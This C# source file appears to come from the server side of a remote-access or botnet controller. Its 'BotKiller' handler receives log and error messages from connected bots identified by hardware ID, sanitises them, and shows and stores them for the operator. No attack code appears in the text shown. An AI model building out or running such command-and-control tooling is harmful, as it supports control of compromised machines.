using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Windows.Forms;
using Server.Connectings;
using Server.Helper;

namespace Server.Messages;

internal class HandlerBotKiller
{
	private static readonly object FileLock = new object();

	public static void Read(Clients client, object[] objects)
	{
		try
		{
			if (objects == null || objects.Length < 2)
			{
				return;
			}
			string command = objects[1] as string;
			if (string.IsNullOrEmpty(command))
			{
				return;
			}
			if (!(command == "Log"))
			{
				if (command == "Error")
				{
					if (objects.Length < 4 || !(objects[2] is string) || !(objects[3] is string))
					{
						return;
					}
					string errorHwid = SecurityHelper.SanitizeHwid(objects[2] as string);
					string errorMessage = objects[3] as string;
					if (!string.IsNullOrEmpty(errorMessage))
					{
						errorMessage = errorMessage.Replace("\r", "").Replace("\n", " ").Trim();
						errorMessage = new string(errorMessage.Where((char c) => !char.IsControl(c)).ToArray());
						if (errorMessage.Length > 2000)
						{
							errorMessage = errorMessage.Substring(0, 2000);
						}
						Methods.AppendLogs(client.IP, "[BotKiller:ERROR:" + errorHwid + "] " + errorMessage, Color.Red);
						SaveLogToFile(client.IP, errorHwid, "ERROR", errorMessage);
					}
				}
				else
				{
					Methods.AppendLogs(client.IP, "[BotKiller:Security] Invalid command from " + client.IP + ": " + command, Color.DarkRed);
					client.Disconnect();
				}
			}
			else
			{
				if (objects.Length < 4 || !(objects[2] is string) || !(objects[3] is string))
				{
					return;
				}
				string hwid = SecurityHelper.SanitizeHwid(objects[2] as string);
				string message = objects[3] as string;
				if (!string.IsNullOrEmpty(message))
				{
					message = message.Replace("\r", "").Replace("\n", " ").Trim();
					message = new string(message.Where((char c) => !char.IsControl(c)).ToArray());
					if (message.Length > 2000)
					{
						message = message.Substring(0, 2000);
					}
					Methods.AppendLogs(client.IP, "[BotKiller:" + hwid + "] " + message, Color.Orange);
					SaveLogToFile(client.IP, hwid, "INFO", message);
				}
			}
		}
		catch (Exception ex)
		{
			Methods.AppendLogs(client.IP, "[BotKiller:InternalError] " + ex.Message, Color.DarkRed);
		}
	}

	private static void SaveLogToFile(string ip, string hwid, string level, string message)
	{
		try
		{
			string logDir = Path.Combine(Application.StartupPath, "Logs", "BotKiller");
			if (!Directory.Exists(logDir))
			{
				Directory.CreateDirectory(logDir);
			}
			string filePath = Path.Combine(logDir, $"{DateTime.Now:yyyy-MM-dd}.log");
			string logEntry = $"[{DateTime.Now:HH:mm:ss}] [{level}] [{ip}] [{hwid}] {message}{Environment.NewLine}";
			lock (FileLock)
			{
				File.AppendAllText(filePath, logEntry);
			}
		}
		catch
		{
		}
	}
}
